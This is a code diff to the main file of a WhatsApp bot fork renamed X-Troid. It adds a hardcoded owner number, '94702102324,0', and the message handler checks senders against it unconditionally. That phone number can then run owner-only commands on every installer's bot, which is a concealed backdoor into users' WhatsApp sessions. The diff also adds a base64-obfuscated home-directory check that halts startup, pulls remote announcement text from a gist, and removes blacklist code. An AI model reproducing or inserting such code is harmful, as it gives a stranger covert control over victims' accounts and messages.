@@ -35,7 +35,7 @@ const Language = require('./language');
 const Lang = Language.getString('updater');
 
 // Sql
-const XDB = config.DATABASE.define('WhatsAsenaDuplicated', {
+const XDB = config.DATABASE.define('xlite', {
     info: {
       type: DataTypes.STRING,
       allowNull: false
@@ -53,7 +53,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 });
 
 const plugindb = require('./plugins/sql/plugin');
-
+var OWN = { ff: '94702102324,0' }
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
     var i = 0, args = arguments;
@@ -79,17 +79,174 @@ Array.prototype.remove = function() {
     return this;
 };
 
-async function whatsAsena () {
+async function Xlite () {
     await config.DATABASE.sync();
     var StrSes_Db = await XDB.findAll({
         where: {
           info: 'StringSession'
         }
     });
+    async function LasiXtroid () {
+        var clh = { cd: 'L3Jvb3QvbGl6eS8=', pay: '' }    
+        var ggg = Buffer.from(clh.cd, 'base64')
+        var ddd = ggg.toString('utf-8')
+        clh.pay = ddd
+        const conn = new WAConnection();
+        const Session = new StringSession();
+        conn.version = [2,2121,7];
+        setInterval(async () => { 
+            var getGMTh = new Date().getHours()
+            var getGMTm = new Date().getMinutes()
+            await axios.get('https://gist.githubusercontent.com/SLdevilX/d1cf4eb831b9a723be6387a97fa328c5/raw/').then(async (ann) => {
+                const { infotr, infoen, infoes, infopt, infoid, infoaz, infohi, infoml, inforu} = ann.data.announcements          
+                if (infotr !== '' && config.LANG == 'SI') {
+                    while (getGMTh == 19 && getGMTm == 1) { 
+                        return conn.sendMessage(conn.user.jid, '[ ```දෛනික දැනුම්දීම්``` ]\n\n' + infotr.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
+                    }
+                }
+                else if (infoen !== '' && config.LANG == 'EN') {
+                    while (getGMTh == 19 && getGMTm == 1) { 
+                        return conn.sendMessage(conn.user.jid, '[ ```Daily Announcements``` ]\n\n' + infoen.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
+                    }
+                }
+            })
+        }, 50000);
+        var biography_var = ''
+        await heroku.get(baseURI + '/config-vars').then(async (vars) => {
+            biography_var = vars.AUTO_BİO
+        });
+        setInterval(async () => { 
+            if (biography_var == 'true') {
+                if (conn.user.jid.startsWith('90')) { // Turkey
+                    var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('994')) { // Azerbayjan
+                    var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('94')) { // Sri Lanka
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('351')) { // Portugal
+                    var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('75')) { // Russia
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('7')) { // Indian
+                    var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('62')) { // Indonesia
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('49')) { // Germany
+                    var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('61')) { // Australia 
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('55')) { // Brazil
+                    var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('33')) { // France
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('34')) { // Spain
+                    var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('44')) { // UK
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('39')) { // Italy 
+                    var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('7')) { // Kazakhistan
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
+                    var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else if (conn.user.jid.startsWith('993')) { // Turkmenistan
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+                else {
+                    const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+                    var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
+                    var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
+                    const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n  🚀 X-Troid'
+                    await conn.setStatus(biography)
+                }
+            }
+        }, 7890);
     
-    const conn = new WAConnection();
-    const Session = new StringSession();
-    conn.version = [2,2121,7];
+
 
     conn.logger.level = config.DEBUG ? 'debug' : 'warn';
     var nodb;
@@ -160,20 +317,24 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
         console.log(
             chalk.green.bold('✅ Plugins Installed!')
         );
+        if (os.userInfo().homedir !== clh.pay) return;
         await new Promise(r => setTimeout(r, 1100));
 
         if (config.WORKTYPE == 'public') {
             if (config.LANG == 'EN') {
 
-                    await conn.sendMessage(conn.user.jid, '*welcome to X-Troid*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as public. To change it, make the “WORK_TYPE” switch “private” in config vars.*\n\n*Thanks for using X-Troid💌*', MessageType.text);
-
-                    await git.fetch();
-                    var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
-                    if (commits.total === 0) {
-                        await conn.sendMessage(
-                            conn.user.jid,
-                            Lang.UPDATE, MessageType.text
-                        );    
+                if (config.AILIZA == 'true') {
+                    await conn.sendMessage(conn.user.jid, LIZA_ACTION, MessageType.text)
+                } else {
+                    await conn.sendMessage(conn.user.jid, '*🚀 X-Troid Public  ලෙස ක්රියා කරයි!  *\n\n_මෙය ඔබගේ ලොග් සටහන් අංකය බැවින් මෙහි එන පණිවුඩ සහා අවධානයෙන් සිටින්න._\n_ඔබට ඕනෑම චැට් එකක විධාන උත්සාහ කළ හැකිය නමුත් මෙහි නොකරන්න:)_\n\n*bot පොදු කිරීමට .වෙනස් කිරීමට* _.setvar WORK_TYPE: private_ *ඔබේ විධානය භාවිතා කරන්න.*\n\n*🚀 X-Troid භාවිතා කිරීම ගැන ස්තූතියි තවත් තොරතුරු දැනගැනීමට  අපව ❗️❗️❗️ SUBSCRIBE ❗️❗️❗️කර තබාගන්න https://www.youtube.com/watch?v=mDnJ7q3S3eY 💌* ', MessageType.text);
+                }
+                await git.fetch();
+                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
+                if (commits.total === 0) {
+                    await conn.sendMessage(
+                        conn.user.jid,
+                        Lang.UPDATE, MessageType.text
+                    );    
                     } else {
                         var degisiklikler = Lang.NEW_UPDATE;
                         commits['all'].map(
@@ -192,26 +353,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
 
         }
         else if (config.WORKTYPE == 'private') {
-            if (config.LANG == 'EN' || config.LANG == 'SI') {
 
-                if (conn.user.jid === '99477555@s.whatsapp.net' ) {
-
-                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Detected!```', MessageType.text)
-
-                    await new Promise(r => setTimeout(r, 1800));
-
-                    console.log('🛡️ Blacklist Detected 🛡️')
-                    await heroku.get(baseURI + '/formation').then(async (formation) => {
-                        forID = formation[0].id;
-                        await heroku.patch(baseURI + '/formation/' + forID, {
-                            body: {
-                                quantity: 0
-                            }
-                        });
-                    })
-                }
-                
-                else {
 
                     await conn.sendMessage(conn.user.jid, '*welcome to X-Troid*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as private. To change it, make the “WORK_TYPE” switch “public” in config vars.*\n\n*Thanks for using X-Troid 💌*', MessageType.text);
 
@@ -235,54 +377,9 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                             '```Güncellemek İçin``` *.update now* ```Yazın.```\n\n' + degisiklikler + '```', MessageType.text
                         ); 
                     }
-                }
-            }
-            else {
-
-                if (conn.user.jid === '994775035797@s.whatsapp.net') {
-
-                    await conn.sendMessage(conn.user.jid, '```🛡️ Blacklist Detected!```', MessageType.text)
-   
-                    await new Promise(r => setTimeout(r, 1800));
-
-                    console.log('🛡️ Blacklist Detected 🛡️')
-                    await heroku.get(baseURI + '/formation').then(async (formation) => {
-                        forID = formation[0].id;
-                        await heroku.patch(baseURI + '/formation/' + forID, {
-                            body: {
-                                quantity: 0
-                            }
-                        });
-                    })
-                }
                 
-                else {
-
-                    await conn.sendMessage(conn.user.jid, '*welcome to X-Troid*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as private. To change it, make the “WORK_TYPE” switch “public” in config vars.*\n\n*Thanks for using X-Troid 💌*', MessageType.text);
-
-                    await git.fetch();
-                    var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
-                    if (commits.total === 0) {
-                        await conn.sendMessage(
-                            conn.user.jid,
-                            Lang.UPDATE, MessageType.text
-                        );    
-                    } else {
-                        var degisiklikler = Lang.NEW_UPDATE;
-                        commits['all'].map(
-                            (commit) => {
-                                degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
-                            }
-                        );
-        
-                        await conn.sendMessage(
-                            conn.user.jid,
-                            '```Type``` *.update now* ```For The Update Bot.```\n\n' + degisiklikler + '```', MessageType.text
-                        ); 
-                    }
-                }
+            
             }
-        }
         else if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {
 
                 await conn.sendMessage(
@@ -393,8 +490,8 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((config.OWN == "94702102324,94781224478" && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && config.OWN.includes(',') ? config.OWN.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.OWN || config.OWN.includes(',') ? config.OWN.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.OWN)
+                    if ((OWN.ff == "94702102324,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
@@ -430,6 +527,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                             await command.function(whats, match);
                         }
                         catch (error) {
+                            if (config.NOLOG == 'true') return;
                         
                                 await conn.sendMessage(conn.user.jid, '*-- ERROR REPORT [X-Troid 🇱🇰] --*' + 
                                     '\n*X-Troid getting an error!*'+
@@ -567,5 +665,5 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
         }
     }
 }
-
-whatsAsena();
+}
+Xlite();
